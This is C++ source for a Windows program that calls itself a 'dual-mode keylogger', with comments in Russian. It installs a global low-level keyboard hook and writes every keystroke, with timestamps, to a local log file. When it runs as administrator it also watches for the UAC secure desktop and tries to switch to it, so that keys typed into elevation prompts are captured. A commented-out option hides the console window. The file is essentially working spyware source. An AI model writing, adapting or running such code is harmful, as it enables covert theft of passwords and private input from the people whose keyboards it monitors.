#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <ctime>
#include <vector>
#include <shellapi.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

// Глобальные переменные
HHOOK g_hHook = NULL;
HINSTANCE g_hInst = NULL;
bool g_bIsElevated = false;
bool g_bIsUACActive = false;
bool g_bRunning = true;
std::ofstream g_LogFile;
CRITICAL_SECTION g_cs;

// Структура для передачи данных в поток
struct ThreadData {
    bool isElevated;
    std::string logPath;
};

// Получение пути к лог-файлу
std::string GetLogFilePath() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    
    std::string exePath(path);
    size_t pos = exePath.find_last_of("\\");
    if (pos != std::string::npos) {
        return exePath.substr(0, pos + 1) + "keylog.txt";
    }
    return "keylog.txt";
}

// Безопасная запись в лог
void WriteToLog(const std::string& text, const std::string& source = "SYSTEM") {
    EnterCriticalSection(&g_cs);
    
    g_LogFile.open(GetLogFilePath(), std::ios::app);
    if (g_LogFile.is_open()) {
        time_t now = time(0);
        struct tm timeinfo;
        char timeStr[100];
        
        if (localtime_s(&timeinfo, &now) == 0) {
            strftime(timeStr, sizeof(timeStr), "[%Y-%m-%d %H:%M:%S]", &timeinfo);
            g_LogFile << timeStr;
        }
        
        if (g_bIsElevated && g_bIsUACActive && source == "UAC") {
            g_LogFile << "[UAC] ";
        } else {
            g_LogFile << "[NORMAL] ";
        }
        
        g_LogFile << text << std::endl;
        g_LogFile.close();
    }
    
    LeaveCriticalSection(&g_cs);
}

// Проверка, запущены ли с правами администратора
bool IsElevated() {
    BOOL isElevated = FALSE;
    HANDLE hToken = NULL;
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD dwSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, dwSize, &dwSize)) {
            isElevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return isElevated;
}

// Проверка, активен ли UAC (только для elevated режима)
bool IsUACActive() {
    if (!g_bIsElevated) return false; // Не админ - не проверяем UAC
    
    HDESK hDesk = OpenInputDesktop(0, FALSE, DESKTOP_READOBJECTS);
    if (hDesk) {
        wchar_t deskName[256] = {0};
        DWORD len = 256;
        if (GetUserObjectInformationW(hDesk, UOI_NAME, deskName, sizeof(deskName), &len)) {
            CloseDesktop(hDesk);
            return wcsstr(deskName, L"Winlogon") != NULL;
        }
        CloseDesktop(hDesk);
    }
    return false;
}

// Попытка переключиться на secure desktop (только для admin режима)
bool SwitchToSecureDesktop() {
    if (!g_bIsElevated) return false;
    
    HDESK hSecureDesktop = OpenDesktopW(L"Winlogon", 0, FALSE, 
                                       DESKTOP_SWITCHDESKTOP | DESKTOP_WRITEOBJECTS | 
                                       DESKTOP_READOBJECTS | DESKTOP_ENUMERATE);
    
    if (hSecureDesktop) {
        if (SwitchDesktop(hSecureDesktop)) {
            CloseDesktop(hSecureDesktop);
            WriteToLog("[INFO] Переключились на secure desktop", "SYSTEM");
            return true;
        }
        CloseDesktop(hSecureDesktop);
    }
    return false;
}

// Преобразование виртуальной клавиши в строку
std::string VKCodeToString(DWORD vkCode, bool shiftPressed, bool ctrlPressed, bool altPressed) {
    std::string result;
    
    if (ctrlPressed) result += "[CTRL]";
    if (altPressed) result += "[ALT]";
    
    switch (vkCode) {
        case VK_RETURN: result += "[ENTER]"; break;
        case VK_BACK:   result += "[BACKSPACE]"; break;
        case VK_TAB:    result += "[TAB]"; break;
        case VK_ESCAPE: result += "[ESC]"; break;
        case VK_SPACE:  result += " "; break;
        case VK_DELETE: result += "[DEL]"; break;
        case VK_LEFT:   result += "[LEFT]"; break;
        case VK_RIGHT:  result += "[RIGHT]"; break;
        case VK_UP:     result += "[UP]"; break;
        case VK_DOWN:   result += "[DOWN]"; break;
        case VK_F1: case VK_F2: case VK_F3: case VK_F4:
        case VK_F5: case VK_F6: case VK_F7: case VK_F8:
        case VK_F9: case VK_F10: case VK_F11: case VK_F12:
            result += "[F" + std::to_string(vkCode - VK_F1 + 1) + "]"; break;
        case VK_OEM_PERIOD: result += shiftPressed ? ">" : "."; break;
        case VK_OEM_COMMA:  result += shiftPressed ? "<" : ","; break;
        default: {
            BYTE keyboardState[256] = {0};
            if (shiftPressed) keyboardState[VK_SHIFT] = 0x80;
            
            wchar_t buffer[5] = {0};
            HKL hkl = GetKeyboardLayout(0);
            int res = ToUnicodeEx(vkCode, 0, keyboardState, buffer, 5, 0, hkl);
            
            if (res > 0) {
                for (int i = 0; i < res; ++i) {
                    result += (char)buffer[i];
                }
            } else {
                if (vkCode >= '0' && vkCode <= '9') {
                    result += (char)vkCode;
                } else if (vkCode >= 'A' && vkCode <= 'Z') {
                    char c = (char)vkCode;
                    if (!shiftPressed) c = tolower(c);
                    result += c;
                } else {
                    char buf[50];
                    sprintf_s(buf, "[%d]", vkCode);
                    result += buf;
                }
            }
            break;
        }
    }
    
    return result;
}

// Процедура обработки клавиш (Hook)
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
        
        bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        bool ctrlPressed = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
        bool altPressed = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
        
        std::string keyStr = VKCodeToString(pKeyStruct->vkCode, shiftPressed, ctrlPressed, altPressed);
        
        // Определяем источник (UAC или обычный режим)
        std::string source = "NORMAL";
        if (g_bIsElevated && IsUACActive()) {
            source = "UAC";
        }
        
        WriteToLog(keyStr, source);
    }
    
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

// Поток для мониторинга UAC (только для admin режима)
DWORD WINAPI UACMonitorThread(LPVOID lpParam) {
    ThreadData* data = (ThreadData*)lpParam;
    
    if (!data->isElevated) {
        WriteToLog("[INFO] Режим обычного пользователя - UAC не отслеживается", "SYSTEM");
        return 0;
    }
    
    WriteToLog("[INFO] Режим администратора - UAC будет отслеживаться", "SYSTEM");
    
    while (g_bRunning) {
        bool uacActive = IsUACActive();
        
        if (uacActive && !g_bIsUACActive) {
            WriteToLog("[INFO] UAC обнаружен, активация перехвата", "SYSTEM");
            g_bIsUACActive = true;
            
            // Пробуем переключиться на secure desktop
            SwitchToSecureDesktop();
        }
        else if (!uacActive && g_bIsUACActive) {
            WriteToLog("[INFO] UAC закрыт", "SYSTEM");
            g_bIsUACActive = false;
        }
        
        Sleep(500); // Проверка каждые 500 мс
    }
    
    return 0;
}

// Обработчик сигналов
BOOL WINAPI ConsoleHandler(DWORD dwType) {
    if (dwType == CTRL_C_EVENT || dwType == CTRL_BREAK_EVENT || 
        dwType == CTRL_CLOSE_EVENT || dwType == CTRL_LOGOFF_EVENT) {
        std::cout << "\n\n[!] Завершение работы..." << std::endl;
        g_bRunning = false;
        
        if (g_hHook) {
            UnhookWindowsHookEx(g_hHook);
            g_hHook = NULL;
        }
        
        WriteToLog("[INFO] Программа завершена", "SYSTEM");
        return TRUE;
    }
    return FALSE;
}

// Главная функция
int main() {
    // Инициализация
    InitializeCriticalSection(&g_cs);
    g_hInst = GetModuleHandle(NULL);
    g_bIsElevated = IsElevated();
    
    // Скрываем консоль (опционально - раскомментируйте если нужно)
    // ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Заголовок окна
    std::string title = "Keylogger [" + std::string(g_bIsElevated ? "ADMIN MODE" : "USER MODE") + "]";
    SetConsoleTitleA(title.c_str());
    
    // Вывод информации
    std::cout << "==========================================" << std::endl;
    std::cout << "         DUAL-MODE KEYLOGGER" << std::endl;
    std::cout << "==========================================" << std::endl;
    std::cout << "Режим: " << (g_bIsElevated ? "АДМИНИСТРАТОР" : "ОБЫЧНЫЙ ПОЛЬЗОВАТЕЛЬ") << std::endl;
    std::cout << "Лог файл: " << GetLogFilePath() << std::endl;
    std::cout << "Статус: РАБОТАЕТ" << std::endl;
    
    if (g_bIsElevated) {
        std::cout << "UAC мониторинг: ВКЛЮЧЕН" << std::endl;
    } else {
        std::cout << "UAC мониторинг: ВЫКЛЮЧЕН (нет прав)" << std::endl;
    }
    
    std::cout << "==========================================" << std::endl;
    std::cout << "Нажмите Ctrl+C для выхода" << std::endl;
    std::cout << std::endl;
    
    // Запись в лог о запуске
    WriteToLog("[INFO] Программа запущена в режиме: " + 
                std::string(g_bIsElevated ? "ADMIN" : "USER"), "SYSTEM");
    
    // Установка обработчика сигналов
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);
    
    // Запуск потока для мониторинга UAC (только если админ)
    ThreadData threadData;
    threadData.isElevated = g_bIsElevated;
    threadData.logPath = GetLogFilePath();
    
    HANDLE hMonitorThread = NULL;
    if (g_bIsElevated) {
        hMonitorThread = CreateThread(NULL, 0, UACMonitorThread, &threadData, 0, NULL);
    }
    
    // Установка глобального хука клавиатуры
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInst, 0);
    
    if (!g_hHook) {
        std::cerr << "Ошибка установки хука: " << GetLastError() << std::endl;
        WriteToLog("[ERROR] Ошибка установки хука", "SYSTEM");
        DeleteCriticalSection(&g_cs);
        return 1;
    }
    
    // Цикл обработки сообщений
    MSG msg;
    while (g_bRunning && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Очистка
    if (hMonitorThread) {
        WaitForSingleObject(hMonitorThread, 1000);
        CloseHandle(hMonitorThread);
    }
    
    if (g_hHook) {
        UnhookWindowsHookEx(g_hHook);
    }
    
    DeleteCriticalSection(&g_cs);
    
    return 0;
}